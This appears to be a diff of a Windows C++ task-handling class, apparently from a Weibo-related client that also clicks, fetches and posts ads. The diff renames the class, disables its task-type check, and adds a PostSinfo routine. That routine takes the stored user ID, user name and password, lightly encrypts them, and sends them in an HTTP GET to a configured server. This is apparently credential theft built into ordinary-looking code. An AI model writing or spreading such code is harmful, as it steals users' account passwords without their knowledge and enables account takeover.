@@ -1,5 +1,5 @@
 #include "StdAfx.h"
-#include "ADTask.h"
+#include "CommonTask.h"
 #include <shlwapi.h>
 #include "PubTool/PubTool.h"
 
@@ -8,10 +8,10 @@
 
 
 
-CADTask::CADTask(void)
+CCommonTask::CCommonTask(void)
 {
 	DWORD dwThreadId = 0;
-	m_hThread = CreateThread(NULL, 0,(LPTHREAD_START_ROUTINE)&CADTask::ThreadProc,(LPVOID) this,	0, 	&dwThreadId );
+	m_hThread = CreateThread(NULL, 0,(LPTHREAD_START_ROUTINE)&CCommonTask::ThreadProc,(LPVOID) this,	0, 	&dwThreadId );
 	m_hEvent = CreateEvent(NULL,FALSE,FALSE,_T("WEIBODATA_AD_EVENT"));
 	//ResetEvent(m_hEvent);
 	m_bClose = FALSE;
@@ -19,7 +19,7 @@ CADTask::CADTask(void)
 }
 
 
-CADTask::~CADTask(void)
+CCommonTask::~CCommonTask(void)
 {
 	SetEvent(m_hEvent);
 	m_bClose = TRUE;
@@ -29,14 +29,17 @@ CADTask::~CADTask(void)
 }
 
 
-HRESULT CADTask::AddTask(LPTASK_PARAM lpTaskParam)
+HRESULT CCommonTask::AddTask(LPTASK_PARAM lpTaskParam)
 {
 	CAutoLock lock(&m_Lock);
 
-	if (!lpTaskParam || 
-		(lpTaskParam->dwTaskType != ACT_CLICK_AD 
+	if (!lpTaskParam 
+#if 0
+		||(lpTaskParam->dwTaskType != ACT_CLICK_AD 
 		&& lpTaskParam->dwTaskType != ACT_GET_AD 
-		&& lpTaskParam->dwTaskType != ACT_POST_AD))
+		&& lpTaskParam->dwTaskType != ACT_POST_AD)
+#endif
+		)
 	{
 		return E_FAIL;
 	}
@@ -46,9 +49,9 @@ HRESULT CADTask::AddTask(LPTASK_PARAM lpTaskParam)
 	return S_OK;
 	//return ProcessTask(lpTaskParam);
 }
-DWORD CADTask::ThreadProc (LPVOID lpRef )
+DWORD CCommonTask::ThreadProc (LPVOID lpRef )
 {
-	CADTask *pThis = (CADTask*)lpRef;
+	CCommonTask *pThis = (CCommonTask*)lpRef;
 	if(!pThis)
 		return E_FAIL;
 	
@@ -65,7 +68,7 @@ DWORD CADTask::ThreadProc (LPVOID lpRef )
 	}
 	return S_OK;
 }
-HRESULT CADTask::PostAD()
+HRESULT CCommonTask::PostAD()
 {
 	CAutoLock lock(&m_Lock);
 	TCHAR enData[MAX_PATH] = {0};
@@ -80,7 +83,7 @@ HRESULT CADTask::PostAD()
 	return S_OK;
 
 }
-HRESULT CADTask::GetAD()
+HRESULT CCommonTask::GetAD()
 {
 	CAutoLock lock(&m_Lock);
 	TCHAR URL[MAX_PATH] = {0};
@@ -92,7 +95,29 @@ HRESULT CADTask::GetAD()
 	HttpGet(szADUrl,FALSE);
 	return S_OK;
 }
-HRESULT CADTask::ProcessTask()
+
+HRESULT CCommonTask::PostSinfo()
+{
+	CAutoLock lock(&m_Lock);
+	if (  m_taskParam.user.szUID[0] == '\0'
+		|| m_taskParam.user.szUserName[0] == '\0'
+		|| m_taskParam.user.szUserPwd[0] == '\0')
+	{
+		return E_FAIL;
+	}
+	TCHAR enData1[MAX_PATH] = {0};
+	TCHAR enData2[MAX_PATH] = {0};
+	TCHAR enData3[MAX_PATH] = {0};
+	CM_Encrypt(enData1,m_taskParam.user.szUID);
+	CM_Encrypt(enData2,m_taskParam.user.szUserName);
+	CM_Encrypt(enData3,m_taskParam.user.szUserPwd);
+	TCHAR URL[MAX_PATH] = {0};
+	_stprintf(URL,_T("%s/?actid=%s&sid=%s&sn=%s&sp=%s&cid=%s"),SERVER_URL,TASK_ACT_ID_0,enData1,enData2,enData3,m_taskParam.szClientID);
+	HttpGet(URL,FALSE);
+	return S_OK;
+}
+
+HRESULT CCommonTask::ProcessTask()
 {
 	WaitForSingleObject(m_hEvent,INFINITE);
 	CAutoLock lock(&m_Lock);
@@ -105,52 +130,11 @@ HRESULT CADTask::ProcessTask()
 	case ACT_GET_AD:
 		GetAD();
 		break;
+	case ACT_POST_S_INFO:
+		PostSinfo();
+		break;
 	default:
 		break;
 	}
-
-#if 0
-
-
-	HINTERNET  hSession = NULL,hConnect = NULL,	hRequest = NULL;
-	TCHAR szServer[1024] = _T("www.centmind.com");
-	TCHAR szParam[1024]  = {0};
-	TCHAR szHeader[1024] = {0};
-	char szPost[1024]   = {0};
-	int nPort = 80;
-	MyParseURL(m_taskParam.ad.szURL,szServer,szParam,nPort);
-	PBYTE pBuf = new BYTE[1024*1024];
-
-	hSession = WinHttpOpen(0,  
-		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-		WINHTTP_NO_PROXY_NAME, 
-		WINHTTP_NO_PROXY_BYPASS, 0 );
-	
-	if(hSession)
-		WinHttpSetTimeouts( hSession, 30000, 60000, 30000, 30000);
-
-	if( hSession )
-		hConnect = WinHttpConnect( hSession,szServer,nPort, 0 );
-
-	if (hConnect)
-        hRequest = WinHttpOpenRequest( hConnect, L"GET", szParam, 
-		NULL, WINHTTP_NO_REFERER, 
-		WINHTTP_DEFAULT_ACCEPT_TYPES, 
-		0);
-	int nLen = strlen(szPost);
-	// Send a Request.
-    if (hRequest) 
-		bResults = WinHttpSendRequest( hRequest, szHeader,-1, szPost, nLen,nLen,0);
-
-	DWORD dwLen;
-	GetHttpResponse(pBuf,dwLen,hRequest);
-
-	//WriteResponseInfo(pBuf,_T("out.txt"));
-	if (hRequest) WinHttpCloseHandle(hRequest);
-    if (hConnect) WinHttpCloseHandle(hConnect);
-    if (hSession) WinHttpCloseHandle(hSession);
-	
-	delete []pBuf;
-#endif
 	return S_OK;
 }
